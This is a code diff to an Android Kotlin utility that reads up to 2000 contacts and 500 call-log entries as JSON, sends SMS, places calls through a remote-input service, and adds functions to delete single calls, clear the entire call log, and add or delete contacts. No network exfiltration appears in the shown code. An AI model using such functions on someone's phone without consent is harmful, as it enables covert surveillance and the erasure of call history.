@@ -2,6 +2,8 @@ package com.example.localutility
 
 import android.annotation.SuppressLint
 import android.content.ClipData
+import android.content.ContentProviderOperation
+import java.util.ArrayList
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
@@ -1330,165 +1332,195 @@ fun sendSms(to: String, message: String): Boolean {
 }
 
 fun getContacts(): JSONArray {
-
     val array = JSONArray()
-
     try {
-
-        val cursor = context.contentResolver.query(
-
-            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-
-            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
-
-            null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC LIMIT 200"
-
+        val projection = arrayOf(
+            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
+            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+            ContactsContract.CommonDataKinds.Phone.NUMBER,
+            ContactsContract.CommonDataKinds.Phone.TYPE,
+            ContactsContract.CommonDataKinds.Phone.PHOTO_THUMBNAIL_URI
         )
-
+        val cursor = context.contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            projection,
+            null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} COLLATE NOCASE ASC LIMIT 2000"
+        )
         cursor?.use {
-
+            val idIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
             val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-
             val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-
+            val typeIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
+            val photoIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_THUMBNAIL_URI)
             while (it.moveToNext()) {
-
-                val obj = JSONObject().apply {
-
-                    put("name", if (nameIdx != -1) it.getString(nameIdx) else "Unknown")
-
-                    put("number", if (numIdx != -1) it.getString(numIdx) else "Unknown")
-
+                val phoneType = when (if (typeIdx != -1) it.getInt(typeIdx) else 0) {
+                    ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
+                    ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
+                    ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
+                    else -> "Mobile"
                 }
-
+                val obj = JSONObject().apply {
+                    put("id", if (idIdx != -1) it.getLong(idIdx) else 0L)
+                    put("name", if (nameIdx != -1) it.getString(nameIdx) ?: "Unknown" else "Unknown")
+                    put("number", if (numIdx != -1) it.getString(numIdx) ?: "Unknown" else "Unknown")
+                    put("type", phoneType)
+                    put("photo", if (photoIdx != -1) it.getString(photoIdx) ?: "" else "")
+                }
                 array.put(obj)
-
             }
-
         }
-
     } catch (e: Exception) { e.printStackTrace() }
-
     return array
-
 }
 
 fun makeCall(number: String) {
-
     try {
-
         val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply {
-
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
-
         }
-
         val targetContext = RemoteInputService.instance ?: context
-
         targetContext.startActivity(intent)
-
     } catch (e: Exception) { e.printStackTrace() }
-
 }
 
 fun getCallLogs(): JSONArray {
-
     val array = JSONArray()
-
     try {
-
         val cursor = context.contentResolver.query(
-
             CallLog.Calls.CONTENT_URI,
-
             arrayOf(
-
+                CallLog.Calls._ID,
                 CallLog.Calls.NUMBER,
-
                 CallLog.Calls.CACHED_NAME,
-
                 CallLog.Calls.TYPE,
-
                 CallLog.Calls.DATE,
-
                 CallLog.Calls.DURATION
-
             ),
-
             null,
-
             null,
-
-            "${CallLog.Calls.DATE} DESC"
-
+            "${CallLog.Calls.DATE} DESC LIMIT 500"
         )
-
         cursor?.use {
-
+            val idIdx = it.getColumnIndex(CallLog.Calls._ID)
             val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
-
             val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
-
             val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
-
             val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
-
             val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
-
             var count = 0
-
-            while (it.moveToNext() && count < 100) {
-
+            while (it.moveToNext() && count < 500) {
                 count++
-
-                val typeStr = when (if (typeIdx != -1) it.getInt(typeIdx) else 0) {
-
+                val typeInt = if (typeIdx != -1) it.getInt(typeIdx) else 0
+                val typeStr = when (typeInt) {
                     CallLog.Calls.INCOMING_TYPE -> "Incoming"
-
                     CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
-
                     CallLog.Calls.MISSED_TYPE -> "Missed"
-
+                    CallLog.Calls.REJECTED_TYPE -> "Missed"
                     else -> "Other"
-
                 }
-
                 val durSec = if (durIdx != -1) it.getLong(durIdx) else 0L
-
                 val durFormatted = String.format("%02d:%02d", durSec / 60, durSec % 60)
-
                 val rawNum = if (numIdx != -1) it.getString(numIdx) ?: "Unknown" else "Unknown"
-
                 val rawName = if (nameIdx != -1 && it.getString(nameIdx) != null) it.getString(nameIdx) else rawNum
-
                 val obj = JSONObject().apply {
-
+                    put("id", if (idIdx != -1) it.getLong(idIdx) else 0L)
                     put("number", rawNum)
-
                     put("name", rawName)
-
                     put("type", typeStr)
-
                     put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
-
                     put("duration", durFormatted)
-
                 }
-
                 array.put(obj)
-
             }
+        }
+    } catch (e: Exception) {
+        e.printStackTrace()
+    }
+    return array
+}
 
+fun deleteCallLog(id: Long?, number: String?, date: Long?): Boolean {
+    return try {
+        if (id != null && id > 0) {
+            context.contentResolver.delete(CallLog.Calls.CONTENT_URI, "${CallLog.Calls._ID} = ?", arrayOf(id.toString())) > 0
+        } else if (!number.isNullOrEmpty() && date != null && date > 0) {
+            context.contentResolver.delete(CallLog.Calls.CONTENT_URI, "${CallLog.Calls.NUMBER} = ? AND ${CallLog.Calls.DATE} = ?", arrayOf(number, date.toString())) > 0
+        } else false
+    } catch (e: Exception) {
+        e.printStackTrace()
+        false
+    }
+}
+
+fun clearCallLogs(): Boolean {
+    return try {
+        context.contentResolver.delete(CallLog.Calls.CONTENT_URI, null, null) >= 0
+    } catch (e: Exception) {
+        e.printStackTrace()
+        false
+    }
+}
+
+fun deleteContact(contactId: Long?, number: String?): Boolean {
+    return try {
+        if (contactId != null && contactId > 0) {
+            val contactUri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_URI, contactId.toString())
+            context.contentResolver.delete(contactUri, null, null) > 0
+        } else if (!number.isNullOrEmpty()) {
+            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number))
+            val cursor = context.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup._ID), null, null, null)
+            var deleted = false
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val id = it.getLong(0)
+                    val cUri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_URI, id.toString())
+                    if (context.contentResolver.delete(cUri, null, null) > 0) deleted = true
+                }
+            }
+            deleted
+        } else false
+    } catch (e: Exception) {
+        e.printStackTrace()
+        false
+    }
+}
+
+fun addContact(name: String, number: String, email: String? = null): Boolean {
+    return try {
+        val ops = ArrayList<ContentProviderOperation>()
+        ops.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
+            .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
+            .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
+            .build())
+
+        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
+            .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
+            .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
+            .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name)
+            .build())
+
+        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
+            .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
+            .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
+            .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, number)
+            .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
+            .build())
+
+        if (!email.isNullOrEmpty()) {
+            ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
+                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
+                .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE)
+                .withValue(ContactsContract.CommonDataKinds.Email.DATA, email)
+                .withValue(ContactsContract.CommonDataKinds.Email.TYPE, ContactsContract.CommonDataKinds.Email.TYPE_HOME)
+                .build())
         }
 
+        context.contentResolver.applyBatch(ContactsContract.AUTHORITY, ops)
+        true
     } catch (e: Exception) {
-
         e.printStackTrace()
-
+        false
     }
-
-    return array
-
 }
 
 fun getInstalledApps(): JSONArray {
@@ -1606,4 +1638,5 @@ fun getStorageStats(): JSONObject {
 }
 
 }
+
 
